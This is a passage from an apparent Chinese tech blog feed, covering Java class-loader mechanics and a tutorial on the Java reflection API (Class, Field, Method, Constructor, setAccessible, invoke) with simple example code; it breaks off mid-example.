InvocationTargetException &#123;</span><br><span class="line">        <span class="type">MyClassLoader</span> <span class="variable">myClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassLoader</span>(<span class="string">&quot;D:\\spring_study\\spel_spring\\src\\main\\java\\&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; person = myClassLoader.findClass(<span class="string">&quot;pers&quot;</span>);</span><br><span class="line">        System.out.println(person.getClassLoader());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> person.newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">sayhello</span> <span class="operator">=</span> person.getDeclaredMethod(<span class="string">&quot;sayhello&quot;</span>);</span><br><span class="line">        sayhello.invoke(o);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">com.zbz.javajichu.MyClassLoader@3feba861</span><br><span class="line">gggggg</span><br></pre></td></tr></table></figure><p><strong>获取ClassLoader几种方式</strong></p><p>它是一个抽象类，其后所有的类加载器继承自 ClassLoader（不包括启动类加载器）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方式一：获取当前类的 ClassLoader</span></span><br><span class="line">clazz.getClassLoader()</span><br><span class="line"><span class="comment">// 方式二：获取当前线程上下文的 ClassLoader</span></span><br><span class="line">Thread.currentThread().getContextClassLoader()</span><br><span class="line"><span class="comment">// 方式三：获取系统的 ClassLoader</span></span><br><span class="line">ClassLoader.getSystemClassLoader()</span><br><span class="line"><span class="comment">// 方式四：获取调用者的 ClassLoader</span></span><br><span class="line">DriverManager.getCallerClassLoader()</span><br></pre></td></tr></table></figure><h3 id="类加载机制—双亲委派机制">类加载机制—双亲委派机制</h3><p>jvm对class文件采用的是按需加载的方式，当需要使用该类时，jvm才会将它的class文件加载到内存中产生class对象。</p><p>在加载类的时候，是采用的双亲委派机制，即把请求交给父类处理的一种任务委派模式。<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713513634255-a91963be-ae07-4350-8c32-c27dbb3f3b76.png" alt=""></p><ul><li><strong>工作原理</strong></li></ul><p>（1）如果一个类加载器接收到了类加载的请求，它自己不会先去加载，会把这个请求委托给父类加载器去执行。</p><p>（2）如果父类还存在父类加载器，则继续向上委托，一直委托到启动类加载器：Bootstrap ClassLoader</p><p>（3）如果父类加载器可以完成加载任务，就返回成功结果，如果父类加载失败，就由子类自己去尝试加载，如果子类加载失败就会抛出ClassNotFoundException异常，这就是双亲委派模式</p><ul><li><strong>第三方包加载方式：反向委派机制</strong></li></ul><p>在Java应用中存在着很多服务提供者接口（Service Provider Interface，SPI），这些接口允许第三方为它们提供实现，如常见的 SPI 有 JDBC、JNDI等，这些 SPI 的接口属于 Java 核心库，一般存在rt.jar包中，由Bootstrap类加载器加载。而Bootstrap类加载器无法直接加载SPI的实现类，同时由于双亲委派模式的存在，Bootstrap类加载器也无法反向委托AppClassLoader加载器SPI的实现类。在这种情况下，我们就需要一种特殊的类加载器来加载第三方的类库，而线程上下文类加载器（双亲委派模型的破坏者）就是很好的选择。</p><p>从图可知rt.jar核心包是有Bootstrap类加载器加载的，其内包含SPI核心接口类，由于SPI中的类经常需要调用外部实现类的方法，而jdbc.jar包含外部实现类(jdbc.jar存在于classpath路径)无法通过Bootstrap类加载器加载，因此只能委派线程上下文类加载器把jdbc.jar中的实现类加载到内存以便SPI相关类使用。显然这种线程上下文类加载器的加载方式破坏了“双亲委派模型”，它在执行过程中抛弃双亲委派加载链模式，使程序可以逆向使用类加载器，当然这也使得Java类加载器变得更加灵活。<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713513649714-a69dcf2d-6590-4e55-9bf4-a706a33c9e46.png" alt=""></p><ul><li><strong>沙箱安全机制</strong></li></ul><p>自定义 String 类，但是在加载自定义 String 类的时候会率先使用引导类加载器加载，而引导类加载器在加载的过程中会先加载 JDK 自带的文件（rt.jar 包中的 javalangString.class），报错信息说没有 main 方法就是因为加载的 rt.jar 包中的 String 类。这样可以保证对 Java 核心源代码的保护，这就是沙箱安全机制。</p><p>参考：<a href="https://segmentfault.com/a/1190000037574626">https://segmentfault.com/a/1190000037574626</a></p><p><a href="https://www.javasec.org/javase/ClassLoader/">https://www.javasec.org/javase/ClassLoader/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Java代码执行流程图&quot;&gt;Java代码执行流程图&lt;/h2&gt;
&lt;p&gt;大家通过这个流程图，了解一下我们写好的Java代码是如何执行的，其中要经历类加载器这个流程，我们就来仔细讲讲这里面的知识点。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://image.baidu</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java基础" scheme="https://oceanzbz.github.io/tags/Java%E5%9F%BA%E7%A1%80/"/>
    
    <category term="类加载" scheme="https://oceanzbz.github.io/tags/%E7%B1%BB%E5%8A%A0%E8%BD%BD/"/>
    
  </entry>
  
  <entry>
    <title>Java反射</title>
    <link href="https://oceanzbz.github.io/post/adc18de0.html"/>
    <id>https://oceanzbz.github.io/post/adc18de0.html</id>
    <published>2024-12-30T04:59:10.000Z</published>
    <updated>2025-03-05T07:24:36.793Z</updated>
    
    <content type="html"><![CDATA[<p>Java反射(Reflection)是Java非常重要的动态特性，通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。Java反射机制是Java语言的动态性的重要体现，也是Java的各种框架底层实现的灵魂。</p><p>反射机制的相关类在哪个包下？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.*;</span><br></pre></td></tr></table></figure><p>反射机制相关的重要的类有哪些？</p><table><thead><tr><th>类</th><th>含义</th></tr></thead><tbody><tr><td>a.lang.Class</td><td>代表整个字节码。代表一个类型，代表整个类。</td></tr><tr><td>java.lang.reflect.Method</td><td>代表字节码中的方法字节码。代表类中的方法。</td></tr><tr><td>java.lang.reflect.Constructor</td><td>代表字节码中的构造方法字节码。代表类中的构造方法。</td></tr><tr><td>java.lang.reflect.Field</td><td>代表字节码中的属性字节码。代表类中的成员变量（静态变量+实例变量）。</td></tr></tbody></table><p>注：必须先获得Class才能获取Method、Constructor、Field。</p><h2 id="1获取Class对象">1获取Class对象</h2><p>Java反射操作的是java.lang.Class对象，所以我们需要先想办法获取到Class对象，通常我们有如下几种方式获取一个类的Class对象：</p><ol><li>类名.class，如:com.anbai.sec.classloader.TestHelloWorld.class。</li><li>Class.forName(“com.anbai.sec.classloader.TestHelloWorld”)。</li><li>classLoader.loadClass(“com.anbai.sec.classloader.TestHelloWorld”);</li></ol><h3 id="通过反射实例化对象">通过反射实例化对象</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象.newInstance()</span><br></pre></td></tr></table></figure><p><strong>注</strong>：newInstance()方法内部实际上调用了<strong>无参数构造方法</strong><font style="color:rgb(77, 77, 77);">，必须保证无参构造存在才可以。<br></font>否则会抛出java.lang.InstantiationException异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest02</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">// 下面这段代码是以反射机制的方式创建对象。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射机制，获取Class，通过Class来实例化对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.User&quot;</span>);</span><br><span class="line">        <span class="comment">// newInstance() 这个方法会调用User这个类的无参数构造方法，完成对象的创建。</span></span><br><span class="line">        <span class="comment">// 重点是：newInstance()调用的是无参构造，必须保证无参构造是存在的！</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> c.newInstance();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你只是希望一个类的<strong>静态代码块</strong>执行，其它代码一律不执行，可以使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;完整类名&quot;</span>);</span><br></pre></td></tr></table></figure><p>这个方法的执行会导致<strong>类加载</strong>，类加载时，静态代码块执行。</p><h2 id="2反射Filed【反射-反编译一个类的属性】">2反射Filed【反射/反编译一个类的属性】</h2><h3 id="2-1Class类方法">2.1Class类方法</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713695474603-5151f213-23dc-44f1-9e7f-5e0dbcf9a1c4.png" alt=""></p><h3 id="2-2Field类方法">2.2Field类方法</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713695685193-eb42119a-1bc4-498c-9e9b-e5193b7adaf5.png" alt=""></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过反射机制，反编译一个类的属性Field（了解一下）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest06</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">studentClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.Student&quot;</span>);</span><br><span class="line">        s.append(Modifier.toString(studentClass.getModifiers()) + <span class="string">&quot; class &quot;</span> + studentClass.getSimpleName() + <span class="string">&quot; &#123;\n&quot;</span>);<span class="comment">// Class类的getName方法</span></span><br><span class="line">        <span class="comment">//获取所有的属性</span></span><br><span class="line">        Field[] fields = studentClass.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field f : fields)&#123;</span><br><span class="line">            s.append(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            <span class="comment">// 获取属性的修饰符列表,返回的修饰符是一个数字，每个数字是修饰符的代号</span></span><br><span class="line">            <span class="comment">// 用Modifier类的toString转换成字符串</span></span><br><span class="line">            s.append(Modifier.toString(f.getModifiers()));</span><br><span class="line">            <span class="keyword">if</span> (f.getModifiers() != <span class="number">0</span>) s.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            s.append(f.getType().getSimpleName());<span class="comment">// 获取属性的类型</span></span><br><span class="line">            s.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            s.append(f.getName());<span class="comment">// 获取属性的名字</span></span><br><span class="line">            s.append(<span class="string">&quot;;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        s.append(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-3通过反射机制访问一个java对象的属性">2.3通过反射机制访问一个java对象的属性</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">必须掌握：</span></span><br><span class="line"><span class="comment">    怎么通过反射机制访问一个java对象的属性？</span></span><br><span class="line"><span class="comment">        给属性赋值set</span></span><br><span class="line"><span class="comment">        获取属性的值get</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest07</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="comment">//不使用反射机制给属性赋值</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        <span class="comment">/**给属性赋值三要素：给s对象的no属性赋值1111</span></span><br><span class="line"><span class="comment">         * 要素1：对象s</span></span><br><span class="line"><span class="comment">         * 要素2：no属性</span></span><br><span class="line"><span class="comment">         * 要素3：1111</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        student.no = <span class="number">1111</span>;</span><br><span class="line">        <span class="comment">/**读属性值两个要素：获取s对象的no属性的值。</span></span><br><span class="line"><span class="comment">         * 要素1：对象s</span></span><br><span class="line"><span class="comment">         * 要素2：no属性</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.out.println(student.no);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用反射机制给属性赋值</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">studentClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.Student&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> studentClass.newInstance();<span class="comment">// obj就是Student对象。（底层调用无参数构造方法）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取no属性（根据属性的名称来获取Field）</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">noField</span> <span class="operator">=</span> studentClass.getDeclaredField(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">        <span class="comment">// 给obj对象(Student对象)的no属性赋值</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            虽然使用了反射机制，但是三要素还是缺一不可：</span></span><br><span class="line"><span class="comment">                要素1：obj对象</span></span><br><span class="line"><span class="comment">                要素2：no属性</span></span><br><span class="line"><span class="comment">                要素3：22222值</span></span><br><span class="line"><span class="comment">            注意：反射机制让代码复杂了，但是为了一个“灵活”，这也是值得的。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        noField.set(obj, <span class="number">22222</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取属性的值</span></span><br><span class="line">        <span class="comment">// 两个要素：获取obj对象的no属性的值。</span></span><br><span class="line">        System.out.println(noField.get(obj));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-3-1set-可以访问私有属性嘛？">2.3.1set()可以访问私有属性嘛？</h4><p>不可以，需要打破封装，才可以。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可以访问私有的属性吗？</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> studentClass.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="comment">// 打破封装（反射机制的缺点：打破封装，可能会给不法分子留下机会！！！）</span></span><br><span class="line"><span class="comment">// 这样设置完之后，在外部也是可以访问private的。</span></span><br><span class="line">nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 给name属性赋值</span></span><br><span class="line">nameField.set(obj, <span class="string">&quot;xiaowu&quot;</span>);</span><br><span class="line"><span class="comment">// 获取name属性的值</span></span><br><span class="line">System.out.println(nameField.get(obj));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-反射Method【反射-反编译一个类的方法】">3.反射Method【反射/反编译一个类的方法】</h2><p>method类方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713695831111-278cb78e-f9ae-4711-9618-8bf811cbe38d.png" alt=""></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">了解一下，不需要掌握（反编译一个类的方法。）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest09</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">userServiceClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line"></span><br><span class="line">        s.append(Modifier.toString(userServiceClass.getModifiers()));</span><br><span class="line">        s.append(<span class="string">&quot; class &quot;</span>);</span><br><span class="line">        s.append(userServiceClass.getSimpleName());</span><br><span class="line">        s.append(<span class="string">&quot; &#123;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取所有的Method（包括私有的！）</span></span><br><span class="line">        Method[] methods = userServiceClass.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method m : methods)&#123;</span><br><span class="line">            s.append(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            <span class="comment">// 获取修饰符列表</span></span><br><span class="line">            s.append(Modifier.toString(m.getModifiers()));</span><br><span class="line">            s.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="comment">// 获取方法的返回值类型</span></span><br><span class="line">            s.append(m.getReturnType().getSimpleName());</span><br><span class="line">            s.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="comment">// 获取方法名</span></span><br><span class="line">            s.append(m.getName());</span><br><span class="line">            s.append(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">            <span class="comment">// 方法的修饰符列表（一个方法的参数可能会有多个。）</span></span><br><span class="line">            Class[] parameterTypes = m.getParameterTypes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; parameterTypes.length; i++)&#123;</span><br><span class="line">                s.append(parameterTypes[i].getSimpleName());</span><br><span class="line">                <span class="keyword">if</span> (i != parameterTypes.length - <span class="number">1</span>) s.append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            s.append(<span class="string">&quot;) &#123;&#125;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        s.append(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-1-1、调用方法四要素">3.1.1、调用方法四要素</h3><p>调用对象userService的login方法</p><ul><li>要素1：<strong>对象</strong> userService</li><li>要素2：login <strong>方法名</strong></li><li>要素3：<strong>实参列表</strong></li><li>要素4：<strong>返回值</strong></li></ul><p><strong>注：</strong> Method类中invoke()使用注意事项：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">方法.invoke(对象, 实参);</span><br></pre></td></tr></table></figure><h4 id="通过反射机制调用一个对象的方法">通过反射机制调用一个对象的方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">重点：必须掌握，通过反射机制怎么调用一个对象的方法？</span></span><br><span class="line"><span class="comment">    五颗星*****</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    反射机制，让代码很具有通用性，可变化的内容都是写到配置文件当中，</span></span><br><span class="line"><span class="comment">    将来修改配置文件之后，创建的对象不一样了，调用的方法也不同了，</span></span><br><span class="line"><span class="comment">    但是java代码不需要做任何改动。这就是反射机制的魅力。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest10</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 不使用反射机制，怎么调用方法</span></span><br><span class="line">        <span class="comment">// 创建对象</span></span><br><span class="line">        <span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserService</span>();</span><br><span class="line">        <span class="comment">// 调用方法</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            要素分析：</span></span><br><span class="line"><span class="comment">                要素1：对象userService</span></span><br><span class="line"><span class="comment">                要素2：login方法名</span></span><br><span class="line"><span class="comment">                要素3：实参列表</span></span><br><span class="line"><span class="comment">                要素4：返回值</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.out.println(userService.login(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;123&quot;</span>) ? <span class="string">&quot;登入成功！&quot;</span> : <span class="string">&quot;登入失败！&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用反射机制调用方法</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">userServiceClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.UserService&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> userServiceClass.newInstance();</span><br><span class="line">        <span class="comment">// 获取Method</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">loginMethod</span> <span class="operator">=</span> userServiceClass.getDeclaredMethod(<span class="string">&quot;login&quot;</span>, String.class, String.class);</span><br><span class="line"><span class="comment">//        Method loginMethod = userServiceClass.getDeclaredMethod(&quot;login&quot;);//注：没有形参就不传</span></span><br><span class="line">        <span class="comment">// 调用方法</span></span><br><span class="line">        <span class="comment">// 调用方法有几个要素？ 也需要4要素。</span></span><br><span class="line">        <span class="comment">// 反射机制中最最最最最重要的一个方法，必须记住。</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            四要素：</span></span><br><span class="line"><span class="comment">            loginMethod方法</span></span><br><span class="line"><span class="comment">            obj对象</span></span><br><span class="line"><span class="comment">            &quot;admin&quot;,&quot;123&quot; 实参</span></span><br><span class="line"><span class="comment">            retValue 返回值</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">resValues</span> <span class="operator">=</span> loginMethod.invoke(obj, <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;123&quot;</span>);<span class="comment">//注：方法返回值是void 结果是null</span></span><br><span class="line">        System.out.println(resValues);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4反射Constructor【反射-反编译一个类的构造方法】">4反射Constructor【反射/反编译一个类的构造方法】</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713696083185-8aeb0f75-d074-4939-9535-2afc8abf6533.png" alt=""></p><h4 id="反编译一个类的构造方法Constructor">反编译一个类的构造方法Constructor</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest11</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">vipClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.Vip&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//public class UserService &#123;</span></span><br><span class="line">        s.append(Modifier.toString(vipClass.getModifiers()));</span><br><span class="line">        s.append(<span class="string">&quot; class &quot;</span>);</span><br><span class="line">        s.append(vipClass.getSimpleName());</span><br><span class="line">        s.append(<span class="string">&quot;&#123;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Constructor[] constructors = vipClass.getDeclaredConstructors();</span><br><span class="line">        <span class="keyword">for</span> (Constructor c : constructors)&#123;</span><br><span class="line">            <span class="comment">//public Vip(int no, String name, String birth, boolean sex) &#123;</span></span><br><span class="line">            s.append(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            